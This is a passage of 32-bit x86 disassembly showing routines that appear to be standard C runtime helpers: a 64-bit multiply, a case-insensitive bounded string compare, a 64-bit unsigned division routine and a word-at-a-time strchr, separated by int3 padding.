  428a0a:	mov    ecx,DWORD PTR [esp+0xc]
  428a0e:	jne    0x428a19
  428a10:	mov    eax,DWORD PTR [esp+0x4]
  428a14:	mul    ecx
  428a16:	ret    0x10
  428a19:	push   ebx
  428a1a:	mul    ecx
  428a1c:	mov    ebx,eax
  428a1e:	mov    eax,DWORD PTR [esp+0x8]
  428a22:	mul    DWORD PTR [esp+0x14]
  428a26:	add    ebx,eax
  428a28:	mov    eax,DWORD PTR [esp+0x8]
  428a2c:	mul    ecx
  428a2e:	add    edx,ebx
  428a30:	pop    ebx
  428a31:	ret    0x10
  428a34:	int3   
  428a35:	int3   
  428a36:	int3   
  428a37:	int3   
  428a38:	int3   
  428a39:	int3   
  428a3a:	int3   
  428a3b:	int3   
  428a3c:	int3   
  428a3d:	int3   
  428a3e:	int3   
  428a3f:	int3   
  428a40:	push   ebp
  428a41:	mov    ebp,esp
  428a43:	push   edi
  428a44:	push   esi
  428a45:	push   ebx
  428a46:	mov    ecx,DWORD PTR [ebp+0x10]
  428a49:	or     ecx,ecx
  428a4b:	je     0x428a9a
  428a4d:	mov    esi,DWORD PTR [ebp+0x8]
  428a50:	mov    edi,DWORD PTR [ebp+0xc]
  428a53:	mov    bh,0x41
  428a55:	mov    bl,0x5a
  428a57:	mov    dh,0x20
  428a59:	lea    ecx,[ecx+0x0]
  428a5c:	mov    ah,BYTE PTR [esi]
  428a5e:	or     ah,ah
  428a60:	mov    al,BYTE PTR [edi]
  428a62:	je     0x428a8b
  428a64:	or     al,al
  428a66:	je     0x428a8b
  428a68:	add    esi,0x1
  428a6b:	add    edi,0x1
  428a6e:	cmp    ah,bh
  428a70:	jb     0x428a78
  428a72:	cmp    ah,bl
  428a74:	ja     0x428a78
  428a76:	add    ah,dh
  428a78:	cmp    al,bh
  428a7a:	jb     0x428a82
  428a7c:	cmp    al,bl
  428a7e:	ja     0x428a82
  428a80:	add    al,dh
  428a82:	cmp    ah,al
  428a84:	jne    0x428a91
  428a86:	sub    ecx,0x1
  428a89:	jne    0x428a5c
  428a8b:	xor    ecx,ecx
  428a8d:	cmp    ah,al
  428a8f:	je     0x428a9a
  428a91:	mov    ecx,0xffffffff
  428a96:	jb     0x428a9a
  428a98:	neg    ecx
  428a9a:	mov    eax,ecx
  428a9c:	pop    ebx
  428a9d:	pop    esi
  428a9e:	pop    edi
  428a9f:	leave  
  428aa0:	ret    
  428aa1:	int3   
  428aa2:	int3   
  428aa3:	int3   
  428aa4:	int3   
  428aa5:	int3   
  428aa6:	int3   
  428aa7:	int3   
  428aa8:	int3   
  428aa9:	int3   
  428aaa:	int3   
  428aab:	int3   
  428aac:	int3   
  428aad:	int3   
  428aae:	int3   
  428aaf:	int3   
  428ab0:	push   esi
  428ab1:	mov    eax,DWORD PTR [esp+0x14]
  428ab5:	or     eax,eax
  428ab7:	jne    0x428ae1
  428ab9:	mov    ecx,DWORD PTR [esp+0x10]
  428abd:	mov    eax,DWORD PTR [esp+0xc]
  428ac1:	xor    edx,edx
  428ac3:	div    ecx
  428ac5:	mov    ebx,eax
  428ac7:	mov    eax,DWORD PTR [esp+0x8]
  428acb:	div    ecx
  428acd:	mov    esi,eax
  428acf:	mov    eax,ebx
  428ad1:	mul    DWORD PTR [esp+0x10]
  428ad5:	mov    ecx,eax
  428ad7:	mov    eax,esi
  428ad9:	mul    DWORD PTR [esp+0x10]
  428add:	add    edx,ecx
  428adf:	jmp    0x428b28
  428ae1:	mov    ecx,eax
  428ae3:	mov    ebx,DWORD PTR [esp+0x10]
  428ae7:	mov    edx,DWORD PTR [esp+0xc]
  428aeb:	mov    eax,DWORD PTR [esp+0x8]
  428aef:	shr    ecx,1
  428af1:	rcr    ebx,1
  428af3:	shr    edx,1
  428af5:	rcr    eax,1
  428af7:	or     ecx,ecx
  428af9:	jne    0x428aef
  428afb:	div    ebx
  428afd:	mov    esi,eax
  428aff:	mul    DWORD PTR [esp+0x14]
  428b03:	mov    ecx,eax
  428b05:	mov    eax,DWORD PTR [esp+0x10]
  428b09:	mul    esi
  428b0b:	add    edx,ecx
  428b0d:	jb     0x428b1d
  428b0f:	cmp    edx,DWORD PTR [esp+0xc]
  428b13:	ja     0x428b1d
  428b15:	jb     0x428b26
  428b17:	cmp    eax,DWORD PTR [esp+0x8]
  428b1b:	jbe    0x428b26
  428b1d:	dec    esi
  428b1e:	sub    eax,DWORD PTR [esp+0x10]
  428b22:	sbb    edx,DWORD PTR [esp+0x14]
  428b26:	xor    ebx,ebx
  428b28:	sub    eax,DWORD PTR [esp+0x8]
  428b2c:	sbb    edx,DWORD PTR [esp+0xc]
  428b30:	neg    edx
  428b32:	neg    eax
  428b34:	sbb    edx,0x0
  428b37:	mov    ecx,edx
  428b39:	mov    edx,ebx
  428b3b:	mov    ebx,ecx
  428b3d:	mov    ecx,eax
  428b3f:	mov    eax,esi
  428b41:	pop    esi
  428b42:	ret    0x10
  428b45:	int3   
  428b46:	int3   
  428b47:	int3   
  428b48:	int3   
  428b49:	int3   
  428b4a:	int3   
  428b4b:	int3   
  428b4c:	int3   
  428b4d:	int3   
  428b4e:	int3   
  428b4f:	int3   
  428b50:	lea    eax,[edx-0x1]
  428b53:	pop    ebx
  428b54:	ret    
  428b55:	lea    esp,[esp+0x0]
  428b5c:	lea    esp,[esp+0x0]
  428b60:	xor    eax,eax
  428b62:	mov    al,BYTE PTR [esp+0x8]
  428b66:	push   ebx
  428b67:	mov    ebx,eax
  428b69:	shl    eax,0x8
  428b6c:	mov    edx,DWORD PTR [esp+0x8]
  428b70:	test   edx,0x3
  428b76:	je     0x428b8d
  428b78:	mov    cl,BYTE PTR [edx]
  428b7a:	add    edx,0x1
  428b7d:	cmp    cl,bl
  428b7f:	je     0x428b50
  428b81:	test   cl,cl
  428b83:	je     0x428bd6
  428b85:	test   edx,0x3
  428b8b:	jne    0x428b78
  428b8d:	or     ebx,eax
  428b8f:	push   edi
  428b90:	mov    eax,ebx
  428b92:	shl    ebx,0x10
  428b95:	push   esi
  428b96:	or     ebx,eax
  428b98:	mov    ecx,DWORD PTR [edx]
  428b9a:	mov    edi,0x7efefeff
  428b9f:	mov    eax,ecx
  428ba1:	mov    esi,edi
  428ba3:	xor    ecx,ebx
  428ba5:	add    esi,eax
  428ba7:	add    edi,ecx
  428ba9:	xor    ecx,0xffffffff
  428bac:	xor    eax,0xffffffff
  428baf:	xor    ecx,edi
  428bb1:	xor    eax,esi
  428bb3:	add    edx,0x4
  428bb6:	and    ecx,0x81010100
  428bbc:	jne    0x428bda
  428bbe:	and    eax,0x81010100
  428bc3:	je     0x428b98
  428bc5:	and    eax,0x1010100
  428bca:	jne    0x428bd4
  428bcc:	and    esi,0x80000000
  428bd2:	jne    0x428b98
  428bd4:	pop    esi
  428bd5:	pop    edi
  428bd6:	pop    ebx
  428bd7:	xor    eax,eax
  428bd9:	ret    
  428bda:	mov    eax,DWORD PTR [edx-0x4]
  428bdd:	cmp    al,bl
  428bdf:	je     0x428c17
  428be1:	test   al,al
  428be3:	je     0x428bd4
  428be5:	cmp    ah,bl
  428be7:	je     0x428c10
  428be9:	test   ah,ah
  428beb:	je     0x428bd4
  428bed:	shr    eax,0x10
  428bf0:	cmp    al,bl
  428bf2:	je     0x428c09
  428bf4:	test   al,al
  428bf6:	je     0x428bd4
  428bf8:	cmp    ah,bl
  428bfa:	je     0x428c02
  428bfc:	test   ah,ah
  428bfe:	je     0x428bd4
  428c00:	jmp    0x428b98
  428c02:	pop    esi
  428c03:	pop    edi
  428c04:	lea    eax,[edx-0x1]
  428c07:	pop    ebx
  428c08:	ret    
  428c09:	lea    eax,[edx-0x2]
  428c0c:	pop    esi
  428c0d:	pop    edi
  428c0e:	pop    ebx
  428c0f:	ret    
  428c10:	lea    eax,[edx-0x3]
  428c13:	pop    esi
  428c14:	pop    edi
  428c15:	pop    ebx
  428c16:	ret    
  428c17:	lea    eax,[edx-0x4]
  428c1a:	pop    esi
  428c1b:	pop    edi
  428c1c:	pop    ebx
  428c1d:	ret    
  428c1e:	jmp    DWORD PTR ds:0x429100
